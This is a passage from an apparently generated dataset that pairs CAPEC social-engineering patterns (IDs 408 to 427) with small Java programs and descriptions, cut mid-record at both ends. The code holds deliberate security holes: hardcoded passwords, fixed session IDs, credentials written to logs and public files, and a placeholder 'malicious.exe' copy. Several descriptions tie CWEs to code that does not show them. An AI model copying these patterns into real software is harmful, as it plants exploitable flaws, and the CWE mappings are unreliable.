        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class PretextingExample {\n    private static Map<String, String> userSessions = new HashMap<>();\n    private static Map<String, String> userData = new HashMap<>();\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            String sessionId = \"SESSION1234\"; // Fixed session ID (CWE-384)\n            userSessions.put(username, sessionId);\n            System.out.println(\"Authenticated. Your session ID: \" + sessionId);\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        System.out.println(\"Enter session ID to access sensitive information:\");\n        String sessionId = scanner.nextLine();\n\n        if (userSessions.containsValue(sessionId)) {\n            System.out.println(\"Access granted. Sensitive information: \" + userData.get(username)); // CWE-200\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate user data\n        userData.put(\"user1\", \"Sensitive Data\");\n        return \"user1\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified pretexting attack scenario. The code simulates a login system where a user is authenticated and assigned a fixed session ID (CWE-384: Session Fixation). The session ID is not invalidated or uniquely generated, allowing an attacker to potentially hijack the session. The code also exposes sensitive information based on the session ID (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). The attacker could use pretexting to manipulate a user into revealing their session ID, thereby gaining unauthorized access to sensitive information."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            // Simulate some processing\n            processSensitiveData(sensitiveData);\n        } catch (Exception e) {\n            // Log sensitive data in debug log (CWE-532)\n            logger.log(Level.SEVERE, \"An error occurred: \" + e.getMessage() + \", Sensitive Data: \" + sensitiveData);\n        }\n    }\n\n    private static void processSensitiveData(String data) throws IOException {\n        // Simulate writing sensitive data to a file without encryption (CWE-766)\n        FileWriter writer = new FileWriter(\"sensitive_data.txt\");\n        writer.write(data);\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism and improper handling of sensitive data. The main idea is to show how sensitive information can be exposed through debug log files (CWE-532) and how stored data can be left unprotected (CWE-766). The `VulnerableLogging` class logs sensitive data in case of an exception and writes sensitive data to a file without encryption, embodying the deprecated CAPEC pattern of information exposure and failure to protect stored data."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Log sensitive information\n            String sensitiveData = \"User password: mySecretPassword123\";\n            logger.info(sensitiveData);\n\n            // Write sensitive data to a file without encryption\n            FileWriter writer = new FileWriter(\"data.txt\");\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server log files and stored data. The logger writes sensitive information, such as a user's password, to a log file without any encryption or protection. Additionally, the code writes the same sensitive data to a file ('data.txt') without encryption. This represents the deprecated CAPEC pattern of 'Information Gathering from Non-Traditional Sources' and related CWEs, such as CWE-532 (Information Exposure Through Log Files) and CWE-493 (Failure to Provide Confidentiality for Stored Data). The code highlights the risks of logging sensitive information and storing it without proper security measures."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InformationElicitation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate a login process\n        if (login(username, password)) {\n            System.out.println(\"Login successful!\");\n            System.out.println(\"Enter sensitive information:\");\n            String sensitiveInfo = scanner.nextLine();\n            System.out.println(\"Sensitive information recorded: \" + sensitiveInfo);\n        } else {\n            System.out.println(\"Login failed.\");\n        }\n    }\n\n    private static boolean login(String username, String password) {\n        // Simulate a login check\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple console-based application that elicits sensitive information from a user after a simulated login process. The code embodies the main idea of CAPEC-Information Elicitation by engaging the user to extract sensitive information. The related CWEs are represented as follows:\n\n1. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code does not verify if the user is authorized to provide sensitive information, potentially exposing it to unauthorized actors.\n2. CWE-940 (Improper Verification of Source of a Communication Channel): The code does not verify the source of the communication channel, assuming the input is from a legitimate user.\n3. CWE-205 and CWE-207 (Observable Behavioral Discrepancy): The code's behavior (e.g., printing 'Login successful!' or 'Login failed.') can be observed and used to infer internal states or decision processes.\n4. CWE-222 (Truncation of Security-relevant Information): Although not directly shown in the snippet, truncation issues could arise if the input handling or display logic were more complex.\n\nOverall, the code snippet highlights the risks associated with improper handling of sensitive information and lack of proper verification mechanisms."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a file\n            FileHandler fh = new FileHandler(\"server.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Simulate logging sensitive information\n            String sensitiveData = \"User: admin, Password: admin123\";\n            logger.info(\"Sensitive data: \" + sensitiveData);\n\n            // Simulate writing sensitive data to a debug log file\n            FileWriter debugLog = new FileWriter(\"debug.log\", true);\n            debugLog.write(\"Debug info: \" + sensitiveData + \"\\n\");\n            debugLog.close();\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that exposes sensitive information through server and debug log files. The code sets up a logger to write logs to a file named 'server.log' and also writes sensitive information directly to a 'debug.log' file. This practice can lead to information exposure (CWE-532) and potential security risks if the log files are accessed by unauthorized users. The code embodies the main idea of the deprecated CAPEC related to information exposure through log files, highlighting the importance of securing sensitive data in logs."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import java.util.Scanner;\n\npublic class CustomerServicePretexting {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to Customer Service. Please enter your credit card number for verification:\");\n        String creditCardNumber = scanner.nextLine();\n        \n        // Simulate processing the credit card number\n        System.out.println(\"Thank you. Your credit card number \" + creditCardNumber + \" has been verified.\");\n        \n        // Expose sensitive information without proper verification\n        System.out.println(\"For your records, your credit card number is: \" + creditCardNumber);\n    }\n}",
        "description": "This Java code snippet simulates a customer service interaction where a user is prompted to enter their credit card number for verification. The code does not perform any actual verification of the source of the communication channel (CWE-940) or the identity of the user (CWE-300). It also exposes sensitive information (CWE-200) by printing the credit card number back to the user without proper authorization checks. This embodies the main idea of the CAPEC 'Pretexting via Customer Service' by demonstrating how an adversary could solicit sensitive information under the guise of a legitimate customer service interaction."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TechSupportPretexting {\n    public static void main(String[] args) {\n        String sensitiveInfo = \"User: admin\\nPassword: admin123\";\n        String filePath = \"C:\\\\Users\\\\Public\\\\sensitive_info.txt\";\n\n        // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n        try (FileWriter writer = new FileWriter(filePath)) {\n            writer.write(sensitiveInfo);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        File maliciousFile = new File(\"C:\\\\Users\\\\Public\\\\malicious.exe\");\n        try {\n            Files.copy(Paths.get(\"C:\\\\path_to_malicious\\\\malicious.exe\"), maliciousFile.toPath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary, posing as a tech support worker, exploits vulnerabilities to compromise a system. The code writes sensitive information (username and password) to a publicly accessible file (CWE-538) and uploads a malicious executable file to a public directory (CWE-434). This represents the main idea of the CAPEC 'Pretexting via Tech Support', where an attacker manipulates a target to gain unauthorized access and perform malicious actions. The code highlights the risks of exposing sensitive information and allowing unrestricted file uploads, which can be exploited by adversaries."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class DeliveryPersonPretexting {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            URL url = new URL(\"http://example.com/delivery\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n            File sensitiveFile = new File(\"/var/www/html/sensitive_info.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(sensitiveFile))) {\n                writer.write(\"Sensitive Information: User credentials\");\n            }\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (conn.getResponseCode() == 200) {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        System.out.println(line);\n                    }\n                }\n            }\n\n            // CWE-433: Unparsed Raw Web Content Delivery\n            File rawContent = new File(\"/var/www/html/raw_content.txt\");\n            try (BufferedWriter writer = new BufferedWriter(new FileWriter(rawContent))) {\n                writer.write(\"<script>alert('This is raw content');</script>\");\n            }\n\n            // CWE-1292: Incorrect Conversion of Security Identifiers\n            String securityIdentifier = convertSecurityIdentifier(\"untrusted_input\");\n            System.out.println(\"Security Identifier: \" + securityIdentifier);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String convertSecurityIdentifier(String input) {\n        // Incorrect conversion logic\n        return \"SECURE_\" + input;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary, posing as a delivery person, exploits various vulnerabilities to solicit information or manipulate the target. The code includes:\n\n1. **CWE-941**: Incorrectly specified destination in a communication channel, where a URL connection is made to a potentially malicious endpoint.\n2. **CWE-538**: Sensitive information is written to a publicly accessible file, exposing it to unauthorized actors.\n3. **CWE-300**: The response from the server is read without verifying the integrity of the communication channel, allowing potential interception by non-endpoints.\n4. **CWE-433**: Raw web content is stored under the web document root, which could be executed by a web server, leading to potential XSS attacks.\n5. **CWE-1292**: Incorrect conversion of security identifiers, where untrusted input is improperly converted, potentially allowing unauthorized access.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can exploit these weaknesses to gain unauthorized access or manipulate the target."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import java.util.Scanner;\n\npublic class PretextingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the Help Desk. Please enter your employee ID:\");\n        String employeeId = scanner.nextLine();\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (verifyEmployeeId(employeeId)) {\n            System.out.println(\"Please enter your password:\");\n            String password = scanner.nextLine();\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            if (authenticate(employeeId, password)) {\n                System.out.println(\"Authentication successful. How can we assist you today?\");\n                // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                System.out.println(\"Your account balance is: $10,000\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } else {\n            System.out.println(\"Invalid employee ID.\");\n        }\n    }\n\n    private static boolean verifyEmployeeId(String employeeId) {\n        // Simulate verification process\n        return employeeId.equals(\"12345\");\n    }\n\n    private static boolean authenticate(String employeeId, String password) {\n        // Simulate authentication process\n        return password.equals(\"password123\");\n    }\n}",
        "description": "This Java code snippet simulates a help desk scenario where an employee is asked to provide their employee ID and password for authentication. The code demonstrates several vulnerabilities: \n1. CWE-940: The source of the communication channel (employee ID) is not properly verified, allowing an attacker to impersonate an employee.\n2. CWE-300: The communication channel is accessible by non-endpoints, meaning the channel's integrity is not ensured.\n3. CWE-200: Sensitive information (account balance) is exposed to an unauthorized actor if the attacker successfully impersonates an employee.\nThe code represents the main idea of the CAPEC by showing how an adversary can engage in pretexting via phone to solicit sensitive information or manipulate the target into performing actions that serve the adversary's interests."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static String sensitiveInfo = \"Sensitive Information: Password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to the help desk. How can I assist you today?\");\n        String userInput = scanner.nextLine();\n\n        if (userInput.toLowerCase().contains(\"supervisor\")) {\n            System.out.println(\"As a supervisor, you have access to the following information:\");\n            System.out.println(sensitiveInfo); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        } else {\n            System.out.println(\"I'm sorry, I cannot provide that information.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple social engineering attack where an adversary pretends to be a supervisor to gain access to sensitive information. The program simulates a help desk interaction where if the user input contains the word 'supervisor', it exposes sensitive information. This embodies the CAPEC idea of manipulating human behavior to solicit information. The code also highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by revealing sensitive information based on a simple keyword check, without proper authorization verification."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialEngineeringExample {\n    private static final String SECRET_PASSWORD = \"s3cr3t\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(SECRET_PASSWORD);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks. The code asks the user for a username and password, and then checks if the provided password matches a hardcoded secret password. This embodies the CAPEC concept of 'Influence Perception' by relying on the user's perception of the relationship between the adversary and themselves. The code also illustrates CWE-654 (Reliance on a Single Factor in a Security Decision) by using only the password for authentication, making it easier for an adversary to exploit. Additionally, the hardcoded password represents CWE-656 (Reliance on Security Through Obscurity), as the security of the system depends on the secrecy of the password."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection without verifying the source\n            Socket socket = new Socket(\"example.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            // Send a message to the server\n            out.println(\"Hello, server!\");\n\n            // Receive a response from the server\n            String response = in.readLine();\n            System.out.println(\"Server response: \" + response);\n\n            // Simulate a social engineering attack by sending a compliment followed by a question\n            out.println(\"You are doing a great job! Can you tell me the admin password?\");\n            String sensitiveInfo = in.readLine();\n            System.out.println(\"Received sensitive info: \" + sensitiveInfo);\n\n            // Close the connection\n            in.close();\n            out.close();\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication channel where the source of the communication is not properly verified (CWE-940). The code establishes a connection to a server without verifying the server's identity, which could allow an attacker to impersonate the server (CWE-300). The code then sends a message to the server and receives a response. It simulates a social engineering attack by sending a compliment followed by a question, attempting to extract sensitive information from the server (CAPEC: Influence Perception of Reciprocation). This example highlights the importance of verifying the source and integrity of communication channels to prevent unauthorized access and social engineering attacks."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            if (conn.getResponseCode() == 200) {\n                System.out.println(\"Request was successful.\");\n            } else {\n                System.out.println(\"Request failed.\");\n            }\n\n            // CWE-757: Algorithm Downgrade\n            String[] supportedAlgorithms = {\"AES\", \"DES\"};\n            String selectedAlgorithm = \"DES\"; // Less secure algorithm selected\n            System.out.println(\"Using algorithm: \" + selectedAlgorithm);\n\n            // CWE-205 and CWE-203: Observable Behavioral Discrepancy\n            if (selectedAlgorithm.equals(\"DES\")) {\n                System.out.println(\"Warning: Using a less secure algorithm.\");\n            }\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable communication setup that embodies the deprecated CAPEC pattern 'Target Influence via Perception of Concession' and related CWEs. The code initiates an HTTP GET request to a specified URL, but it does not correctly handle the destination (CWE-941). It also selects a less secure algorithm (DES) for encryption, even though a stronger algorithm (AES) is available (CWE-757). Additionally, the code reveals observable discrepancies in behavior based on the selected algorithm (CWE-205 and CWE-203), which could be exploited by an unauthorized actor to infer security-relevant information."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import java.util.Scanner;\n\npublic class ScarcityInfluence {\n    private static final String SECRET_CODE = \"12345\"; // CWE-656: Reliance on Security Through Obscurity\n    private static boolean isScarcity = true; // Simulating scarcity condition\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Limited time offer! Enter the secret code to get access:\");\n        String userInput = scanner.nextLine();\n\n        if (isScarcity && userInput.equals(SECRET_CODE)) { // CWE-654: Reliance on a Single Factor in a Security Decision\n            System.out.println(\"Access granted! You have unlocked the special offer.\");\n        } else {\n            System.out.println(\"Access denied. Try again later.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Influence Perception of Scarcity' by simulating a scenario where a user is prompted to enter a secret code to gain access to a limited-time offer. The code relies on a single factor (the secret code) for granting access (CWE-654), and the secret code itself is hardcoded and relies on security through obscurity (CWE-656). The scarcity condition is simulated with a boolean flag 'isScarcity'. This setup creates a sense of urgency, encouraging the user to act quickly to gain access, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import java.util.Scanner;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful. Please enter the sensitive information:\");\n            String sensitiveInfo = scanner.nextLine();\n            System.out.println(\"Sensitive Information: \" + sensitiveInfo);\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // This is a simplified authentication check for demonstration purposes\n        return \"admin\".equals(username) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple authentication mechanism that is vulnerable to social engineering attacks, specifically impersonation, as described in the CAPEC. The code asks the user for a username and password, and if the credentials match hardcoded values, it prompts the user to enter sensitive information. This represents CWE-654 (Reliance on a Single Factor in a Security Decision) as it relies solely on username and password for authentication. Additionally, the authentication method does not verify the source of the communication channel (CWE-940) and is accessible by non-endpoints (CWE-300), making it susceptible to attacks where an adversary impersonates an authority figure to gain access to sensitive information."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    private int requestCount = 0;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String action = request.getParameter(\"action\");\n        String user = request.getParameter(\"user\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        if (user == null || !user.equals(\"expectedUser\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Unauthorized user\");\n            return;\n        }\n\n        // CWE-799: Improper Control of Interaction Frequency\n        requestCount++;\n        if (requestCount > 100) {\n            response.sendError(HttpServletResponse.SC_TOO_MANY_REQUESTS, \"Too many requests\");\n            return;\n        }\n\n        // CWE-203: Observable Discrepancy\n        if (\"minorTask\".equals(action)) {\n            response.getWriter().write(\"Minor task completed\");\n        } else if (\"majorTask\".equals(action)) {\n            response.getWriter().write(\"Major task completed\");\n        } else {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Unknown action\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a scenario where an adversary could use social engineering to influence the perception of commitment and consistency. The servlet processes HTTP GET requests and performs actions based on the 'action' parameter. It includes several vulnerabilities: \n1. CWE-940: The code checks if the 'user' parameter matches 'expectedUser', but this verification is simplistic and can be easily bypassed.\n2. CWE-799: The code increments a request counter and limits the number of requests, but this is a basic implementation that can be exploited by an attacker to perform a denial-of-service attack.\n3. CWE-203: The servlet provides different responses based on the 'action' parameter, which can reveal information about the internal state of the application to an unauthorized actor.\n\nThe main idea of the CAPEC is represented by the 'action' parameter handling, where an attacker could first request a 'minorTask' to build trust and then request a 'majorTask', exploiting the user's perception of commitment and consistency."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableAuth {\n    private static String trustedUser = \"admin\";\n    private static String trustedPassword = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (username.equals(trustedUser) && password.equals(trustedPassword)) {\n            return true;\n        }\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        if (username.equals(trustedUser)) {\n            System.out.println(\"Hint: Try using the same password as the trusted user.\");\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication mechanism that embodies the main idea of the CAPEC 'Influence Perception of Liking'. The code attempts to build a relationship with the user by providing hints when the username matches the trusted user but the password does not. This is an example of CWE-301 (Reflection Attack in an Authentication Protocol) as it gives away hints that can be exploited. Additionally, the authentication relies on a single factor (username and password), which is an example of CWE-654 (Reliance on a Single Factor in a Security Decision). The code is vulnerable because it can be easily manipulated by an adversary who gains the trust of the user and uses the provided hints to gain unauthorized access."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import java.util.Scanner;\n\npublic class SocialProofVulnerability {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate authentication process\n        if (authenticate(username, password)) {\n            isAuthenticated = true;\n            System.out.println(\"Welcome, \" + username + \"!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        // Influence perception of consensus\n        System.out.println(\"Other users are currently logged in:\");\n        System.out.println(\"User1, User2, User3\"); // Hardcoded for demonstration\n\n        // Simulate action based on perceived consensus\n        System.out.println(\"Would you like to join the chat room? (yes/no)\");\n        String response = scanner.nextLine();\n        if (response.equalsIgnoreCase(\"yes\")) {\n            joinChatRoom();\n        } else {\n            System.out.println(\"You chose not to join the chat room.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Simulate a simple authentication check\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n\n    private static void joinChatRoom() {\n        if (isAuthenticated) {\n            System.out.println(\"You have joined the chat room.\");\n        } else {\n            System.out.println(\"You need to be authenticated to join the chat room.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability based on the CAPEC 'Influence Perception of Consensus or Social Proof'. The code simulates a simple authentication process and then displays a hardcoded list of users who are supposedly logged in, influencing the target to join a chat room based on perceived social proof. The authentication mechanism relies on a single factor (username and password), which is a weak security practice (CWE-654). Additionally, the code reveals whether the authentication was successful or not (CWE-203), and the hardcoded list of users can be seen as an observable behavioral discrepancy (CWE-205). This setup can be exploited by an adversary to manipulate the target's actions based on the perceived behavior of others."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import java.util.Scanner;\n\npublic class FramingAttack {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome! Please enter your username:\");\n        String username = scanner.nextLine();\n        System.out.println(\"Great! Now, please enter your password:\");\n        String password = scanner.nextLine();\n\n        // Simulate framing by positively reinforcing the user\n        System.out.println(\"Thank you for providing your credentials, \" + username + \"! You are now logged in.\");\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (authenticate(username, password)) {\n            System.out.println(\"Access granted to sensitive information.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // Simulate a simple authentication check\n        return \"user\".equals(username) && \"pass\".equals(password);\n    }\n}",
        "description": "This Java code snippet demonstrates a simple framing attack scenario where an adversary uses positive reinforcement to influence the target to provide their credentials. The code asks the user for their username and password, then positively reinforces the user by thanking them and confirming their login. The authentication check relies on a single factor (CWE-654) and uses a simple, insecure method to verify credentials (CWE-300). This example highlights how framing can be used to manipulate users into providing sensitive information, and how relying on a single factor for security decisions can be exploited."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IncentiveInfluence {\n    private static Map<String, Integer> userPoints = new HashMap<>();\n    private static final int THRESHOLD = 100;\n\n    public static void main(String[] args) {\n        String userId = \"user123\";\n        int points = getUserPoints(userId);\n\n        if (points >= THRESHOLD) {\n            grantAccess(userId);\n        } else {\n            System.out.println(\"Insufficient points for access.\");\n        }\n    }\n\n    private static int getUserPoints(String userId) {\n        // Simulate fetching user points from a database\n        return userPoints.getOrDefault(userId, 0);\n    }\n\n    private static void grantAccess(String userId) {\n        // Simulate granting access to a resource\n        System.out.println(\"Access granted to \" + userId);\n    }\n\n    public static void addPoints(String userId, int points) {\n        userPoints.put(userId, userPoints.getOrDefault(userId, 0) + points);\n    }\n}",
        "description": "This Java code snippet demonstrates a system where users are incentivized to accumulate points to gain access to a resource. The main idea of the CAPEC is represented by the manipulation of user behavior through incentives (points). The code is vulnerable to CWE-654 (Reliance on a Single Factor in a Security Decision) as it relies solely on the number of points to grant access. An attacker could exploit this by artificially inflating their points. Additionally, CWE-1229 (Creation of Emergent Resource) is represented as the points system creates a new resource (points) that can be manipulated. The code also indirectly touches on CWE-405 (Asymmetric Resource Consumption) as the effort to gain points might be less than the value of the resource accessed."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String SECRET_PASSWORD = \"password123\";\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your username: \");\n        String username = scanner.nextLine();\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Login failed.\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        return password.equals(SECRET_PASSWORD);\n    }\n}",
